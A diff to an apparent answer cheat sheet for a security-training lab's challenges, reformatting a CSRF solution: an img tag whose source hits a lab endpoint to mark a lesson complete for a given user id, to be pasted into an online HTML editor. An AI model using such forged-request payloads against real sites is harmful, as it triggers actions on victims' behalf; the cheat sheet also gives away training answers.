@@ -231,7 +231,9 @@ To complete this challenge, a user must exploit an SQL Wild Card Enumeration in 
 CSRF Cheat 
 
 to complete this challenge paste the following js in [https://htmledit.squarefree.com/] link
-`<img src="https://192.168.235.113:42281/root/grantComplete/csrfLesson?userId=112013236"/>`
+```
+<img src="https://192.168.235.113:42281/root/grantComplete/csrfLesson?userId=112013236"/>
+```
 
 CSRF Challenge JSON \- not available good luck
 
